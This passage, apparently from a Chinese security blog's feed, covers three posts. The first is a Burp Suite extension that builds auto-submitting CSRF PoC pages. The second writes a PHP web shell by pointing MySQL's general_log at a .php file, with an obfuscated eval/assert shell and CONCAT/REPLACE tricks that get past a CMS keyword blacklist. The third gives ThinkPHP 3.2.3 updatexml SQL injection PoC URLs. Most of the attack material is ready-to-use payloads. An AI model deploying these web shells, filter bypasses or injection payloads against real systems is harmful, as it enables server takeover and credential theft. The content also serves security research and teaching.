class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;JMenuItem&gt; <span class="title">createMenuItems</span><span class="params">(IContextMenuInvocation invocation)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 上下文菜单</span></span><br><span class="line">    List&lt;JMenuItem&gt; jMenuItemList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    JMenu jMenu = <span class="keyword">new</span> JMenu(<span class="string">"Mi1k7ea's Extender"</span>);</span><br><span class="line">    JMenuItem jMenuItem = <span class="keyword">new</span> JMenuItem(<span class="string">"Generate CSRF PoC"</span>);</span><br><span class="line">    jMenu.add(jMenuItem);</span><br><span class="line">    jMenuItemList.add(jMenu);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听上下文菜单点击事件</span></span><br><span class="line">    jMenuItem.addActionListener(e -&gt; &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jMenuItemList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实涉及到的就是Java Swing编程，具体看网上资料即可。主要是创建自己的上下文菜单项然后设置监听事件，当点击时触发addActionListener()函数里面的代码逻辑。</p><p>其中监听触发的代码，直接看注释就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成PoC的GUI框</span></span><br><span class="line">JFrame frame = <span class="keyword">new</span> JFrame(<span class="string">"CSRF PoC"</span>);</span><br><span class="line">JPanel codePanel = <span class="keyword">new</span> JPanel(<span class="keyword">new</span> GridLayout());</span><br><span class="line"></span><br><span class="line"><span class="comment">// getSelectedMessages()函数用于获取当前显示的或用户选中的HTTP请求/响应的细节</span></span><br><span class="line"><span class="comment">// analyzeRequest()函数用于分析HTTP请求信息以便获取到多个键的值</span></span><br><span class="line">IHttpRequestResponse iHttpRequestResponse = invocation.getSelectedMessages()[<span class="number">0</span>];</span><br><span class="line">IRequestInfo iRequestInfo = <span class="keyword">this</span>.helpers.analyzeRequest(iHttpRequestResponse);</span><br><span class="line"></span><br><span class="line">URL url = iRequestInfo.getUrl();</span><br><span class="line">String method = iRequestInfo.getMethod();</span><br><span class="line">String http_method = <span class="string">""</span>;</span><br><span class="line">String request_url = <span class="string">""</span>;</span><br><span class="line">String params = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取request参数并生成对应input标签</span></span><br><span class="line">    List&lt;IParameter&gt; iParameters = iRequestInfo.getParameters();</span><br><span class="line">    <span class="keyword">for</span> (IParameter iParameter : iParameters) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.equals(<span class="string">"POST"</span>)) &#123;</span><br><span class="line">            request_url = url.toString();</span><br><span class="line">            http_method = <span class="string">" method=\"POST\""</span>;</span><br><span class="line">            <span class="keyword">if</span> (iParameter.getType() == IParameter.PARAM_BODY) &#123;</span><br><span class="line">                params += <span class="string">"      &lt;input type=\"hidden\" name=\""</span> + EncodeSpecialChars(iParameter.getName()) + <span class="string">"\" value=\""</span> + EncodeSpecialChars(iParameter.getValue()) + <span class="string">"\" /&gt;\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"GET"</span>)) &#123;</span><br><span class="line">            request_url = url.toString().split(<span class="string">"\\?"</span>)[<span class="number">0</span>];</span><br><span class="line">            http_method = <span class="string">" method=\"GET\""</span>;</span><br><span class="line">            <span class="keyword">if</span> (iParameter.getType() == IParameter.PARAM_URL) &#123;</span><br><span class="line">                params += <span class="string">"      &lt;input type=\"hidden\" name=\""</span> + EncodeSpecialChars(iParameter.getName()) + <span class="string">"\" value=\""</span> + EncodeSpecialChars(iParameter.getValue()) + <span class="string">"\" /&gt;\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">    exception.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组合成CSRF自动提交PoC</span></span><br><span class="line"><span class="keyword">final</span> String PoC = <span class="string">"&lt;html&gt;\n"</span> +</span><br><span class="line">    <span class="string">"  &lt;body&gt;\n"</span> +</span><br><span class="line">    <span class="string">"    &lt;form action=\""</span> + request_url + <span class="string">"\""</span> + http_method + <span class="string">"&gt;\n"</span> +</span><br><span class="line">    params +</span><br><span class="line">    <span class="string">"      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n"</span> +</span><br><span class="line">    <span class="string">"    &lt;/form&gt;\n"</span> +</span><br><span class="line">    <span class="string">"  &lt;/body&gt;\n"</span> +</span><br><span class="line">    <span class="string">"  &lt;script&gt;\n"</span> +</span><br><span class="line">    <span class="string">"    var m = document.getElementsByTagName('form')[0];\n"</span> +</span><br><span class="line">    <span class="string">"    m.submit();\n"</span> +</span><br><span class="line">    <span class="string">"  &lt;/script&gt;\n"</span> +</span><br><span class="line">    <span class="string">"&lt;/html&gt;"</span>;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将PoC设置到新建的GUI框中</span></span><br><span class="line">JTextArea jt = <span class="keyword">new</span> JTextArea(PoC);</span><br><span class="line">JScrollPane scrollPane = <span class="keyword">new</span> JScrollPane(jt);</span><br><span class="line">jt.setEditable(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">frame.add(codePanel, BorderLayout.CENTER);</span><br><span class="line">codePanel.add(scrollPane);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建Buttom用于Copy PoC</span></span><br><span class="line">JPanel buttonPanel = <span class="keyword">new</span> JPanel(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">JButton button = <span class="keyword">new</span> JButton(<span class="string">"Copy"</span>);</span><br><span class="line">buttonPanel.add(button);</span><br><span class="line">frame.add(buttonPanel, BorderLayout.PAGE_END);</span><br><span class="line">button.addActionListener(e1 -&gt; &#123;</span><br><span class="line">    Toolkit toolkit = Toolkit.getDefaultToolkit();</span><br><span class="line">    Clipboard clipboard = toolkit.getSystemClipboard();</span><br><span class="line">    StringSelection CSRFCodeToCopy = <span class="keyword">new</span> StringSelection(PoC);</span><br><span class="line">    clipboard.setContents(CSRFCodeToCopy, CSRFCodeToCopy);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置GUI框样式</span></span><br><span class="line">frame.setSize(<span class="number">600</span>,<span class="number">500</span>);</span><br><span class="line">frame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);</span><br></pre></td></tr></table></figure><p>其中EncodeSpecialChars()函数用于处理一些PoC的input标签中特殊字符和解码问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进行URL解码和对input标签内的属性值特殊字符进行HTML编码，可自行补充</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">EncodeSpecialChars</span><span class="params">(String content)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    content = URLDecoder.decode(content, <span class="string">"UTF-8"</span>);</span><br><span class="line">    String special_word = <span class="string">"&lt;&gt;\"'"</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; special_word.length(); i++) &#123;</span><br><span class="line">        <span class="keyword">char</span> word = special_word.charAt(i);</span><br><span class="line">        String w = Character.toString(word);</span><br><span class="line">        <span class="keyword">if</span> (content.contains(w)) &#123;</span><br><span class="line">            String ascii_word = Integer.toString(word);</span><br><span class="line">            String html_word = <span class="string">"&amp;#"</span> + ascii_word + <span class="string">";"</span>;</span><br><span class="line">            System.out.println(html_word);</span><br><span class="line">            content = content.replace(w, html_word);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OK，最后来看下效果吧。</p><p>将项目打包成jar包后，然后加载进来：</p><p><img src="/2020/09/04/BurpExtender开发之CSRF-PoC生成器/3.png" alt=""></p><p>对任意报文，右键就能看到插件，点击就能加载生成CSRF PoC：</p><p><img src="/2020/09/04/BurpExtender开发之CSRF-PoC生成器/4.png" alt=""></p><p><img src="/2020/09/04/BurpExtender开发之CSRF-PoC生成器/5.png" alt=""></p><p>OK，更多的插件后面再写。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Java安全开发" scheme="https://www.mi1k7ea.com/categories/Java/Java%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="安全开发" scheme="https://www.mi1k7ea.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="BurpSuite" scheme="https://www.mi1k7ea.com/tags/BurpSuite/"/>
    
  </entry>
  
  <entry>
    <title>SQL语句利用日志写shell及相关绕过</title>
    <link href="https://www.mi1k7ea.com/2020/07/19/SQL%E8%AF%AD%E5%8F%A5%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E5%86%99shell%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87/"/>
    <id>https://www.mi1k7ea.com/2020/07/19/SQL语句利用日志写shell及相关绕过/</id>
    <published>2020-07-19T09:17:28.000Z</published>
    <updated>2020-07-19T09:58:41.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本原理"><a href="#0x01-基本原理" class="headerlink" title="0x01 基本原理"></a>0x01 基本原理</h2><p>在能够写SQL语句的地方，outfile、dumpfile、drop database等都被禁止，一般进行SQL注入来getshell或删库的方式行不通了。</p><p>但是如果MySQL是root用户启动的，那么可以进行如下利用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;  <span class="comment">#查看配置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;  <span class="comment">#开启general log模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'/var/www/html/1.php'</span>;   <span class="comment">#设置日志目录为shell地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>  <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><p>SQL查询免杀shell的语句（参考：<a href="https://evi1cg.me/archives/test1.html" target="_blank" rel="noopener">SQL语句利用日志写shell</a>）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?&gt;"</span></span><br></pre></td></tr></table></figure><h2 id="0x02-Bypass案例"><a href="#0x02-Bypass案例" class="headerlink" title="0x02 Bypass案例"></a>0x02 Bypass案例</h2><p>这个案例虽然鸡肋，但是思路还可以。</p><h3 id="过滤-php"><a href="#过滤-php" class="headerlink" title="过滤 .php"></a>过滤 .php</h3><p>代码审计某CMS时，看到一处写SQL语句的地方，此处之前报过漏洞，修复方案是过滤了outfile、dumpfile、drop database等，此外还过滤了<code>.php</code>字符串，为的就是防住SQL语句日志写shell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'outfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'dumpfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “dumpfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'.php'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/^drop(.*)database/i"</span>, $sql))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 不允许删除数据库！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接写上述的SQL语句肯定是不行的，因为<code>set global general_log_file = &#39;/var/www/html/1.php&#39;;</code>的<code>.php</code>会被过滤掉。</p><p>这里只是针对字符串的检测，可以用字符串拼接的方式Bypass，这里可以使用SQL语句中的concat家族系列函数来实现字符串拼接来Bypass：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;   <span class="comment">#查看配置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;        <span class="comment">#开启general log模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file =<span class="keyword">CONCAT</span>(<span class="string">"/var/www/html/1."</span>,<span class="string">"php"</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>;   <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><h3 id="过滤-php和concat"><a href="#过滤-php和concat" class="headerlink" title="过滤 .php和concat"></a>过滤 .php和concat</h3><p>在这次报过的漏洞之后，CMS厂商修改了这个洞，就是添加了对concat的字符串过滤，这样concat家族系列函数就使不上了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'outfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'dumpfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “dumpfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'.php'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'concat'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “concat” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/^drop(.*)database/i"</span>, $sql))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 不允许删除数据库！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用concat进行字符串拼接的方式没法绕过了，但是除了字符串拼接，我们还能使用字符串替换的操作来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;   <span class="comment">#查看配置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;        <span class="comment">#开启general log模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file =<span class="keyword">REPLACE</span>(<span class="string">"/var/www/html/1.jpg"</span>,<span class="string">"jpg"</span>,<span class="string">"php"</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>;   <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><h3 id="过滤-php、concat和replace"><a href="#过滤-php、concat和replace" class="headerlink" title="过滤 .php、concat和replace"></a>过滤 .php、concat和replace</h3><p>CMS厂商收到新的绕过漏洞报告后，又进行新一轮的修复，过滤了replace：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'outfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'dumpfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “dumpfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'.php'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'concat'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “concat” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stripos($sql, <span class="string">'replace'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “replace” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/^drop(.*)database/i"</span>, $sql))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 不允许删除数据库！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串拼接和替换都不能成功进行利用了，还有啥办法不？</p><p>当然还有新的Bypass方法哈哈。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SQL注入" scheme="https://www.mi1k7ea.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP V3.2.3 SQL注入总结</title>
    <link href="https://www.mi1k7ea.com/2020/06/14/ThinkPHP-V3-2-3-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/06/14/ThinkPHP-V3-2-3-SQL注入总结/</id>
    <published>2020-06-14T15:16:10.000Z</published>
    <updated>2020-06-14T15:17:22.260Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-find"><a href="#0x01-find" class="headerlink" title="0x01 find()"></a>0x01 find()</h2><p>漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = M(<span class="string">'users'</span>)-&gt;find(I(<span class="string">'GET.id'</span>));</span><br><span class="line">    var_dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)#</span><br></pre></td></tr></table></figure><h2 id="0x02-select"><a href="#0x02-select" class="headerlink" title="0x02 select()"></a>0x02 select()</h2><p>漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = i(<span class="string">'id'</span>);</span><br><span class="line">    $res = M(<span class="string">'user'</span>)-&gt;select($id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC，有很多地方可注，这里主要列举三个<code>table</code>，<code>alias</code>，<code>where</code>，更多还请自行跟踪一下<code>parseSql</code>的各个<code>parseXXX</code>方法，目测都是可行的，比如<code>having</code>,<code>group</code>等：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table：http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">alias：http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">where: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br></pre></td></tr></table></figure><h2 id="0x03-delete"><a href="#0x03-delete" class="headerlink" title="0x03 delete()"></a>0x03 delete()</h2><p>漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = i(<span class="string">'id'</span>);</span><br><span class="line">    $res = M(<span class="string">'user'</span>)-&gt;delete($id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC，同上，这里粗略举三个例子，<code>table</code>,<code>alias</code>,<code>where</code>，但使用<code>table</code>和<code>alias</code>的时候，同时还必须保证<code>where</code>不为空：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">where: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">alias: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">table: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span><br></pre></td></tr></table></figure><h2 id="0x04-where"><a href="#0x04-where" class="headerlink" title="0x04 where()"></a>0x04 where()</h2><p>漏洞代码1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $User = D(<span class="string">'Users'</span>);</span><br><span class="line">    $map = <span class="keyword">array</span>(<span class="string">'id'</span> =&gt; $_GET[<span class="string">'id'</span>]);</span><br><span class="line">    $user = $User-&gt;where($map)-&gt;find();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC：</p><figure class="highlight plain"><table><tr><td 